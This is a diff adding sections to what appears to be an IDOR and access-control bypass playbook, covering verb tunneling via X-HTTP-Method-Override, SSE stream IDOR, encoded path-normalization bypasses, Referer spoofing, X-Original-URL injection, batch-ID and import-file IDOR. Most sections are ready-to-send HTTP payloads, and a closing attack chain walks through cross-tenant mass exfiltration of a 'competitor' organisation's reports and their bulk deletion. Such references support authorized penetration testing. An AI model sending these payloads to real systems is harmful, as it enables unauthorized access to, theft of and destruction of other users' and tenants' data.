@@ -1239,6 +1239,418 @@ done
     (endCursor), Elasticsearch scroll, MongoDB resume_token, and any `page_token` / `after`
     / `continuation_token` parameter.
 
+19. **HTTP verb tunneling via X-HTTP-Method-Override** (NEW 2026-05-30) — Method-based ACLs
+    that block DELETE/PATCH are routinely bypassed by tunneling via POST with the
+    `X-HTTP-Method-Override: DELETE` header or `_method=DELETE` parameter. Rails, Django REST
+    Framework, Laravel, and .NET support verb overriding by default. WAFs configured to block
+    DELETE/PATCH at the HTTP layer pass POST requests through; the backend then executes the
+    overridden method. Look for `_method` in HTML form sources as a leading indicator.
+
+20. **Server-Sent Events (SSE) stream IDOR** (NEW 2026-05-30) — SSE is a one-way push
+    channel opened via HTTP GET and authenticated once at connection time. Apps exposing SSE
+    endpoints like `/api/events?userId=` or `/sse/user/{id}` never re-validate ownership
+    after the initial handshake. SSE adoption is accelerating (AI agent status streams, live
+    dashboards, trading feeds) and consistently lacks the message-level auth guards that
+    WebSocket implementations at least attempt. Any `userId`, `channel`, or `topic` parameter
+    in an SSE URL is high-priority for IDOR testing.
+
+21. **Path normalization IDOR across API gateway / backend boundary** (NEW 2026-05-30) — API
+    gateways (Kong, Nginx, AWS API GW, Apigee) apply authorization on the raw URL string they
+    receive. The upstream backend normalizes URL-encoded sequences and dot-segments before
+    routing. Crafting paths like `/api/users/1001%2F..%2F1002` satisfies the gateway auth
+    check (matches authorized resource 1001) while the backend resolves to a different object
+    (1002). Double encoding (`%252F`) bypasses gateways that URL-decode once before the check.
+    This pattern is especially effective against Spring/Java backends behind Nginx proxies.
+
+22. **Referer-based access control bypass** (NEW 2026-05-30) — Legacy applications and
+    internal tooling sometimes check the `Referer` header rather than validating session roles.
+    Since `Referer` is fully attacker-controlled, spoofing it to match a trusted admin URL
+    grants access without valid credentials. Primary targets: internal admin tools, legacy PHP
+    apps, operations dashboards, and any endpoint that returns 403 without a Referer but 200
+    when one is added. Also check `Origin` header as an alternative auth signal.
+
+23. **Bulk/batch operation per-object auth gap** (NEW 2026-05-30) — Batch endpoints that
+    accept `{"ids": [...]}` arrays are the single largest category of missed IDOR in
+    production APIs. Authorization is checked at the request level (is the user logged in?)
+    but never at the object level (does the user own each ID in the array?). This affects
+    bulk delete, bulk export, bulk archive, bulk tag, and bulk status-change operations
+    across virtually every SaaS platform. Mixing one owned ID with victim IDs in the batch
+    is sufficient to trigger the vulnerability.
+
+24. **X-Original-URL / X-Rewrite-URL header injection** (NEW 2026-05-30) — Nginx, Varnish,
+    IIS, and Symfony deployments with certain proxy configurations trust `X-Original-URL` or
+    `X-Rewrite-URL` headers from external clients. The proxy applies ACL to the outer
+    request path while the backend routes using the header value. Setting
+    `X-Original-URL: /admin/users` on a request to `/public/health` gives the backend the
+    admin path while the proxy saw only the public path. First documented in Symfony apps
+    (CVE-2012-6432 pattern); still found in default Nginx configs copied from documentation.
+
+25. **Import/bulk-upload file IDOR** (NEW 2026-05-30) — CSV, JSON, and XML import features
+    validate file format and uploader authentication but skip ownership checks on object IDs
+    embedded in the file content. This is the most underreported IDOR class because it
+    requires crafting a malicious file, not just a modified HTTP parameter. Impact scales
+    linearly with import batch size — a single upload can affect thousands of victim records.
+    Highest impact in CRM, HR, fintech, and data-pipeline SaaS platforms where imports are
+    core product features and routinely contain external_id mappings to existing objects.
+
+---
+
+## HTTP Verb Tunneling IDOR (X-HTTP-Method-Override)
+**Reference type:** Any (numeric/GUID/hash)
+**API pattern:** REST
+**Authorization flaw:** Some frameworks (Rails, Django, .NET, Express) support HTTP verb overriding via the `X-HTTP-Method-Override`, `X-Method-Override`, or `X-HTTP-Method` request headers, or via a `_method` query/body parameter. A WAF or ACL layer that only checks the outer HTTP method (POST — allowed) passes the request through; the backend then executes the overridden method (DELETE/PUT — restricted). Verb tunneling bypasses method-based access control and WAF rules that selectively block DELETE/PATCH without inspecting override headers.
+**Escalation:** Horizontal / Vertical
+**Business impact:** Delete or overwrite another user's resources by tunneling a privileged HTTP verb through a permitted one. Particularly impactful on REST APIs where DELETE/PATCH are admin-only.
+**Test payload:**
+```http
+# Normal DELETE blocked at WAF/ACL:
+DELETE /api/users/1002 HTTP/1.1
+Authorization: Bearer <your-token>
+→ 403 Forbidden
+
+# Tunneled via POST with override header:
+POST /api/users/1002 HTTP/1.1
+Authorization: Bearer <your-token>
+X-HTTP-Method-Override: DELETE
+→ 200 OK (backend executes DELETE, ACL only checked POST)
+
+# Alternative header names:
+X-Method-Override: DELETE
+X-HTTP-Method: DELETE
+
+# Alternative: _method query parameter (Rails, Laravel):
+POST /api/users/1002?_method=DELETE HTTP/1.1
+Authorization: Bearer <your-token>
+
+# Alternative: _method in form body:
+POST /api/users/1002 HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+_method=DELETE&confirm=true
+
+# Also use for PATCH (partial update bypass):
+POST /api/users/1002 HTTP/1.1
+X-HTTP-Method-Override: PATCH
+Content-Type: application/json
+{"role": "admin"}
+
+# Discovery: look for _method in HTML forms in the app source,
+# or X-HTTP-Method-Override in API documentation / Swagger specs
+```
+**Source:** https://portswigger.net/web-security/access-control; https://owasp.org/www-project-web-security-testing-guide/
+
+---
+
+## IDOR via Server-Sent Events (SSE)
+**Reference type:** Numeric / GUID / topic name
+**API pattern:** REST (SSE over HTTP long-poll / EventSource)
+**Authorization flaw:** Server-Sent Events (SSE) establish a persistent one-way push channel via a standard HTTP GET request. The connection authenticates once via cookie or Authorization header, but the event stream topic, channel name, or `userId` parameter embedded in the SSE endpoint URL is not validated against the authenticated session. Any valid session can open an SSE connection subscribed to any user's event stream, receiving all real-time pushes (notifications, order updates, live scores, trade confirmations) for that user.
+**Escalation:** Horizontal
+**Business impact:** Real-time exfiltration of another user's live event stream — notifications, order status, chat messages, financial transaction alerts, or admin audit events — using a single valid auth token.
+**Test payload:**
+```http
+# Step 1: Observe your own SSE connection:
+GET /api/events?userId=1001 HTTP/1.1
+Accept: text/event-stream
+Authorization: Bearer <your-token>
+→ Server streams:
+  data: {"type": "notification", "msg": "Your order shipped"}
+  data: {"type": "balance", "amount": 1250.00}
+
+# Step 2: Substitute another user's ID:
+GET /api/events?userId=1002 HTTP/1.1
+Accept: text/event-stream
+Authorization: Bearer <your-token>
+→ If server streams user 1002's events → IDOR confirmed
+
+# Common SSE endpoint patterns:
+GET /stream?channel=user_1002_notifications
+GET /events/feed?account=ACC-1002
+GET /sse/user/1002
+GET /realtime?topic=orders.user.1002
+GET /api/live-updates?clientId=1002
+
+# curl test (streams output):
+curl -N -H "Authorization: Bearer <token>" \
+  "https://target.com/api/events?userId=1002"
+
+# Browser EventSource test:
+const es = new EventSource('/api/events?userId=1002', {
+  headers: {'Authorization': 'Bearer <token>'}
+});
+es.onmessage = e => console.log(e.data);
+
+# Also test: topic-based SSE where topic = resource ID
+GET /api/sse/documents/9982  ← another user's document live-edit stream
+GET /api/sse/tickets/5001    ← another user's support ticket event stream
+```
+**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References; https://owasp.org/www-project-api-security/
+
+---
+
+## Path Normalization IDOR (API Gateway vs Backend Discrepancy)
+**Reference type:** Numeric / path-based
+**API pattern:** REST
+**Authorization flaw:** An API gateway or reverse proxy (Nginx, AWS API Gateway, Kong, Apigee) applies authorization on the raw URL string it receives. The backend application normalizes the URL before routing — resolving `%2F` (encoded slash), `./`, `../`, or duplicate slashes. A crafted URL can satisfy the gateway's ACL check (matching the authorized resource path) while resolving to a different resource on the backend. This is the authorization equivalent of path traversal.
+**Escalation:** Horizontal / Vertical
+**Business impact:** Access resources the gateway considers authorized (matching your user ID in the path) while the backend serves a completely different user's data. Particularly impactful when the gateway is the sole authorization boundary.
+**Test payload:**
+```http
+# Gateway authz checks raw path: /api/users/1001 ✓ (your user ID)
+# Backend normalizes and resolves to: /api/users/1002 ✗
+
+# Encoded slash traversal:
+GET /api/users/1001%2F..%2F1002 HTTP/1.1
+Authorization: Bearer <your-token>
+# Gateway sees: /api/users/1001%2F..%2F1002 (contains "1001" → authorized)
+# Backend decodes: /api/users/1001/../1002 → /api/users/1002
+
+# Double-encoded traversal (bypasses gateway URL decode):
+GET /api/users/1001%252F..%252F1002 HTTP/1.1
+# Gateway decodes once: /api/users/1001%2F..%2F1002 → sees "1001" → authorized
+# Backend decodes twice: /api/users/1001/../1002 → /api/users/1002
+
+# Duplicate slash normalization:
+GET /api/users//1002 HTTP/1.1
+# Some gateways treat //1002 as invalid and skip auth; backend normalizes to /1002
+
+# Dot-segment bypass:
+GET /api/v1/users/1001/./../../v1/users/1002/profile HTTP/1.1
+
+# Semicolon path parameter injection (Java/Spring):
+GET /api/users/1001;x=y/../1002 HTTP/1.1
+# Spring strips ;x=y → /api/users/1001/../1002 → /api/users/1002
+
+# Null byte / Unicode normalization (rare, worth testing):
+GET /api/users/1001%00/../1002 HTTP/1.1
+
+# Test matrix: for each encoded sequence, check:
+# - Gateway response: should be 403 if working correctly
+# - Backend response (if gateway passes): should be the victim's data
+# Tool: Burp Suite "Bypass WAF" extension, or manual URL encoding variants
+```
+**Source:** https://owasp.org/www-project-web-security-testing-guide/; https://github.com/swisskyrepo/PayloadsAllTheThings/
+
+---
+
+## Referrer-Based Access Control Bypass
+**Reference type:** Route-level (any protected path)
+**API pattern:** REST (legacy / poorly-implemented apps)
+**Authorization flaw:** Some applications implement access control by checking the `Referer` (HTTP request header) rather than performing proper server-side session/role validation. The server assumes that if the request came from `/admin/dashboard` (trusted page), the requester must have admin access. Since the `Referer` header is fully attacker-controlled, spoofing it to a trusted internal URL grants access to restricted resources without valid credentials or roles.
+**Escalation:** Vertical (admin access) / Horizontal
+**Business impact:** Complete bypass of role-based access controls on any endpoint using referer-checking as its sole authorization mechanism. Impacts legacy apps, internal tools, and admin panels built without proper session-based RBAC.
+**Test payload:**
+```http
+# Without bypass — restricted endpoint returns 403:
+GET /admin/users HTTP/1.1
+Host: target.com
+Authorization: Bearer <regular-user-token>
+→ 403 Forbidden
+
+# With spoofed Referer — tricks server into granting admin access:
+GET /admin/users HTTP/1.1
+Host: target.com
+Authorization: Bearer <regular-user-token>
+Referer: https://target.com/admin/dashboard
+→ 200 OK (admin user list returned)
+
+# Test variant — no token at all, referer provides "auth":
+GET /admin/export HTTP/1.1
+Host: target.com
+Referer: https://target.com/admin/panel
+→ If 200 OK without any auth token → critical: referer is the only auth check
+
+# Common trusted referer values to try:
+Referer: https://target.com/admin
+Referer: https://target.com/admin/dashboard
+Referer: https://target.com/admin/panel
+Referer: https://target.com/internal
+Referer: https://target.com/management
+Referer: https://admin.target.com/
+
+# API endpoint variant:
+POST /api/admin/reset_all HTTP/1.1
+Referer: https://target.com/admin/danger-zone
+Content-Type: application/json
+{}
+
+# Indicator: look for apps that show 403 without a Referer
+# and 200 after adding one — a dead giveaway of referer-based ACL
+# Also check: Origin header as an alternative auth signal
+Referer: https://target.com/admin
+Origin: https://target.com
+```
+**Source:** https://portswigger.net/web-security/access-control; https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/
+
+---
+
+## Bulk / Batch Operation IDOR
+**Reference type:** Numeric / GUID (array of IDs)
+**API pattern:** REST / GraphQL
+**Authorization flaw:** Bulk and batch API endpoints accept arrays of object IDs to perform operations (delete, export, tag, archive, mark-read) on multiple resources in one request. The authorization check validates only that the requester is authenticated, or checks that they own at least one ID in the batch — never performing per-object ownership validation on every ID in the array. Mixing your own ID with victim IDs in a single batch request causes the server to process all of them.
+**Escalation:** Horizontal
+**Business impact:** Mass deletion, mass export, mass modification of other users' objects. A single authenticated request can affect hundreds of victim objects with no per-resource auth check. Particularly impactful in SaaS platforms where bulk operations touch financial records, customer data, or document repositories.
+**Test payload:**
+```http
+# Batch delete — mix your own ID with victim IDs:
+DELETE /api/documents/bulk HTTP/1.1
+Authorization: Bearer <your-token>
+Content-Type: application/json
+{"ids": ["doc_own_9001", "doc_victim_8001", "doc_victim_8002"]}
+→ 200 OK {"deleted": 3}   ← all 3 deleted, including victim docs
+
+# Batch export — include victim IDs to dump their data:
+POST /api/reports/export HTTP/1.1
+Authorization: Bearer <your-token>
+Content-Type: application/json
+{"report_ids": [1001, 1002, 1003, 9982, 9983]}
+→ Returns export including IDs 9982, 9983 (belong to another user)
+
+# Batch archive:
+POST /api/messages/archive HTTP/1.1
+Authorization: Bearer <your-token>
+{"message_ids": [5001, 5002, 9001, 9002]}   ← 9001, 9002 belong to victim
+
+# Batch tag / label:
+PATCH /api/items/bulk-tag HTTP/1.1
+Authorization: Bearer <your-token>
+{"ids": [victim_id_1, victim_id_2], "tag": "spam"}
+
+# GraphQL batch via aliases (enumerate via single request):
+mutation {
+  d1: deletePost(id: "victim_post_1") { success }
+  d2: deletePost(id: "victim_post_2") { success }
+  d3: deletePost(id: "victim_post_3") { success }
+}
+
+# GraphQL HTTP batch request (array of operations):
+POST /graphql HTTP/1.1
+Content-Type: application/json
+[
+  {"query": "mutation { deletePost(id: \"victim_1\") { success } }"},
+  {"query": "mutation { deletePost(id: \"victim_2\") { success } }"}
+]
+
+# Testing approach:
+# 1. Find any bulk/batch endpoint in the app (look for "ids", "items", "resources" array params)
+# 2. Create two accounts A and B; get B's object IDs
+# 3. From account A: send batch request mixing A's own ID + B's IDs
+# 4. Verify from account B: their objects were affected
+```
+**Source:** https://owasp.org/www-project-api-security/; https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References
+
+---
+
+## X-Original-URL / X-Rewrite-URL Header IDOR
+**Reference type:** Route-level (any protected path)
+**API pattern:** REST
+**Authorization flaw:** Some reverse proxies and web frameworks (Nginx with `proxy_set_header`, Varnish, IIS with URL rewriting, Symfony's `Request::enableHttpMethodParameterOverride`) trust `X-Original-URL` or `X-Rewrite-URL` headers from clients. The proxy applies access control to the outer request path (e.g., `/public/health`) while passing the `X-Original-URL` header to the backend, which processes the override URL instead (`/admin/users`). The backend sees `/admin/users`, the proxy's ACL saw only `/public/health`.
+**Escalation:** Vertical (admin paths) / Horizontal (any internal path)
+**Business impact:** Access any internal endpoint — admin panels, internal APIs, health dashboards, metrics, configuration endpoints — by setting a header that the reverse proxy forwards untouched to the backend, which routes based on the header value.
+**Test payload:**
+```http
+# Step 1: Send request to a public path with X-Original-URL targeting admin:
+GET / HTTP/1.1
+Host: target.com
+X-Original-URL: /admin/users
+→ If 200 OK with admin data → header injection confirmed
+
+# Alternate header names:
+GET / HTTP/1.1
+X-Rewrite-URL: /admin/dashboard
+
+GET /public HTTP/1.1
+X-Custom-IP-Authorization: 127.0.0.1
+X-Original-URL: /admin/reset
+
+# IIS-specific X-Original-URL (used in Symfony CVE-2012-6432 pattern):
+GET /public HTTP/1.1
+X-Original-URL: /admin/config
+→ IIS rewrites to /admin/config for backend processing
+
+# Test matrix — try common internal paths:
+X-Original-URL: /admin
+X-Original-URL: /admin/users
+X-Original-URL: /internal/metrics
+X-Original-URL: /actuator/env          ← Spring Boot
+X-Original-URL: /api/internal/debug
+X-Original-URL: /.well-known/security.txt  ← check for exposed internal routing
+
+# Combine with path parameters to reach specific objects:
+GET /public HTTP/1.1
+X-Original-URL: /api/users/1002/profile
+
+# Detection: send a request with X-Original-URL: /nonexistent
+# If you get a 404 (not 200 for the outer path), the header is being processed
+
+# Affected configurations:
+# - Nginx: proxy_pass + proxy_set_header X-Original-URL $request_uri
+# - Symfony: Request::enableHttpMethodParameterOverride() (also enables X-Rewrite-URL)
+# - Varnish: vcl_recv with req.http.X-Original-URL
+# - Laravel/Lumen behind reverse proxy with trusted headers not configured
+```
+**Source:** https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html; https://portswigger.net/research/top-10-web-hacking-techniques-2023
+
+---
+
+## IDOR via CSV / Bulk Import File Upload
+**Reference type:** Numeric / GUID / named reference (embedded in import file)
+**API pattern:** REST (file upload → async processing)
+**Authorization flaw:** Import/bulk-upload features (user import, contact import, product catalog upload, order bulk-create) accept files containing object references (user IDs, account IDs, org IDs, resource keys). The server validates the file format and the uploader's authentication, but does not verify that each referenced object in the file belongs to the authenticated user. The backend processes every row, performing reads or writes on objects the importer has no business access to.
+**Escalation:** Horizontal / Tenant isolation
+**Business impact:** Read or overwrite another user's/org's data at scale by crafting an import file containing their object IDs. In SaaS platforms: bulk-import another tenant's customer records, financial data, or configurations. Also enables bulk deletion/modification if the import supports update operations.
+**Test payload:**
+```csv
+# Scenario: CRM "import contacts" feature — CSV maps to existing account IDs
+# Observe your own account ID from normal app usage: ACC-1001
+
+# Craft a malicious import CSV referencing another org's account IDs:
+account_id,action,email,phone
+ACC-1001,export,,,          ← your own (to pass validation)
+ACC-1002,export,,,          ← competitor's account ID
+ACC-1003,export,,,          ← another org
+ACC-9999,export,,,          ← enumerate sequential IDs
+
+# Upload the crafted file:
+POST /api/contacts/import HTTP/1.1
+Authorization: Bearer <your-token>
+Content-Type: multipart/form-data; boundary=----Boundary
+
+------Boundary
+Content-Disposition: form-data; name="file"; filename="import.csv"
+Content-Type: text/csv
+
+account_id,action,email
+ACC-1002,export,,
+ACC-1003,export,,
+------Boundary--
+
+# Poll the import job result — returns data for all referenced accounts:
+GET /api/imports/job_4521/results HTTP/1.1
+Authorization: Bearer <your-token>
+→ Returns exported data for ACC-1002 and ACC-1003 (cross-tenant IDOR)
+
+# JSON import variant:
+POST /api/users/bulk-import HTTP/1.1
+Content-Type: application/json
+{"users": [
+  {"external_id": "EXT-9982", "merge_with": "user_1002"},  ← victim's user ID
+  {"external_id": "EXT-9983", "merge_with": "user_1003"}
+]}
+→ Merges attacker-controlled data into victim users' accounts
+
+# High-value import endpoints to test:
+POST /api/contacts/import
+POST /api/users/bulk-create
+POST /api/orders/import
+POST /api/products/upload
+POST /api/accounts/merge
+POST /api/data/sync
+
+# Indicator: any import endpoint that accepts IDs referencing existing objects
+# always test whether those IDs are ownership-checked against the session
+```
+**Source:** https://owasp.org/www-project-api-security/; https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References
+
 ---
 
 ## Bypass Matrix
@@ -1274,6 +1686,13 @@ done
 | Next.js middleware enforces auth | Add `x-middleware-subrequest: middleware` header — skips all middleware (CVE-2025-29927, CVSS 9.1) |
 | Chatbot/AI platform "internal" API | Intercept chatbot XHR in Burp — sequential `lead_id` / `session_id` in internal endpoints → decrement to enumerate all records |
 | Opaque cursor / pagination token | Decode base64 cursor, modify `userId` / `tenantId` / `lastId`, re-encode — pagination scope not re-validated against session |
+| WAF/ACL blocks DELETE/PATCH | Tunnel via POST + `X-HTTP-Method-Override: DELETE` or `_method=DELETE` param — proxy sees POST (allowed), backend executes DELETE |
+| SSE stream seems user-scoped | Change `userId` / `channel` / `topic` in SSE URL — connection auth checked once at handshake, stream target never ownership-validated |
+| Gateway auth on raw URL string | Path-traversal in encoded form: `/api/users/1001%2F..%2F1002` — gateway matches "1001" (authorized), backend normalizes to "1002" |
+| Referer-based access gate | Set `Referer: https://target.com/admin` — header is attacker-controlled; some legacy apps grant access based solely on referer value |
+| Protected path blocks direct access | Set `X-Original-URL: /admin/users` on request to `/public` — reverse proxy applies ACL to outer path, backend routes to header value |
+| Per-object check on individual requests | Submit batch `{"ids": [own_id, victim_id_1, victim_id_2]}` — bulk endpoints validate auth but skip per-object ownership check on each array element |
+| Import/upload seems safe (your data only) | Craft import CSV/JSON with victim's object IDs — import processing validates file format but not ownership of referenced IDs |
 
 ---
 
@@ -1311,6 +1730,13 @@ done
 | Next.js middleware-protected routes (any path on unpatched self-hosted Next.js) | Route-level bypass | CVE-2025-29927 — all auth/RBAC bypassed with one header; CVSS 9.1 |
 | Cursor/pagination endpoints (`?cursor=`, `?after=`, `?page_token=`) | Encoded token | Full cross-user data stream access via decoded and re-encoded cursor |
 | Write-only / side-effect endpoints (unsubscribe, delete, mark-read, revoke) | Numeric / GUID | Blind IDOR: silent sabotage with no visible attacker-side data leak |
+| Any REST endpoint accepting DELETE/PATCH — try POST + X-HTTP-Method-Override | Numeric / GUID | Tunneled verb bypasses method-specific WAF rules and ACL middleware |
+| SSE endpoints (`/api/events`, `/stream`, `/sse/`, `/realtime`) with `userId` / `channel` param | Numeric / topic name | Real-time event stream for any user with a single valid session token |
+| Admin / internal paths behind reverse proxy (Nginx, Kong, AWS API Gateway) | Route-level | Path normalization discrepancy — gateway authorizes "your" path, backend resolves to different object |
+| Any endpoint returning 403 based on `Referer` absence | Route-level | Referer header is attacker-controlled — legacy apps using it as sole ACL signal |
+| Reverse proxy configs with `X-Original-URL` / `X-Rewrite-URL` (Nginx, Varnish, Symfony) | Route-level | Admin path accessible by setting header on public-facing request |
+| Bulk/batch endpoints: `DELETE /bulk`, `POST /export`, `PATCH /bulk-tag`, `POST /archive` | Array of IDs | Per-object auth skipped; mix own ID with victim IDs in the array |
+| Import/upload endpoints (`/import`, `/bulk-create`, `/sync`, `/upload`) accepting ID references | ID embedded in file | Cross-tenant data access by embedding victim's IDs in import CSV/JSON |
 
 ---
 
@@ -1532,6 +1958,47 @@ Impact: Critical — full authentication + authorization bypass on any unpatched
 self-hosted Next.js (< 12.3.5 / 13.5.9 / 14.2.25 / 15.2.3)
 Note: Vercel-hosted apps are auto-patched; self-hosted Docker/Node deployments are primary targets
 CVE: CVE-2025-29927, CVSS 9.1
+```
+
+### Chain 10: Bulk IDOR + Verb Tunneling → Cross-Tenant Mass Data Exfil
+
+```
+1. Sign up for a SaaS analytics platform. Note your organization's report IDs from the UI:
+   GET /api/v2/reports → {"reports": [{"id": "RPT-9001"}, {"id": "RPT-9002"}]}
+
+2. Discover the bulk export endpoint from the API docs or JS bundle:
+   POST /api/reports/export {"ids": ["RPT-9001", "RPT-9002"]}
+   → {"job_id": "EXP-4521"}
+   → GET /api/exports/EXP-4521/download → your org's reports (expected behavior)
+
+3. Enumerate adjacent report IDs from another org (sequential prefix):
+   RPT-9001 (yours) → try RPT-8001 through RPT-8100 (competitor range)
+
+4. Include victim IDs in the bulk export request — no per-object check:
+   POST /api/reports/export HTTP/1.1
+   Authorization: Bearer <your-org-token>
+   {"ids": ["RPT-9001", "RPT-8001", "RPT-8002", "RPT-8003"]}
+   → {"job_id": "EXP-4522"}
+   → GET /api/exports/EXP-4522/download → includes victim org's reports — IDOR confirmed
+
+5. The DELETE bulk endpoint is PATCH-based; WAF blocks PATCH but allows POST:
+   PATCH /api/reports/bulk-delete {"ids": ["RPT-8001"]} → 403 (WAF blocks PATCH)
+
+   Tunnel via POST + X-HTTP-Method-Override:
+   POST /api/reports/bulk-delete HTTP/1.1
+   X-HTTP-Method-Override: PATCH
+   Authorization: Bearer <your-token>
+   {"ids": ["RPT-8001", "RPT-8002"]}
+   → 200 OK — victim org's reports deleted (WAF saw POST, backend executed PATCH)
+
+6. Automate full cross-tenant dump:
+   for id in range(8000, 9000):
+     POST /api/reports/export {"ids": [f"RPT-{id}"]}
+   → Each export job returns another org's confidential analytics data
+
+Impact: Critical — cross-tenant mass data exfiltration + bulk destruction via tunneled verb
+Key insight: Bulk endpoints multiply the IDOR blast radius from 1 object to thousands;
+verb tunneling makes the destructive write variant exploitable despite WAF protection
 ```
 
 ---
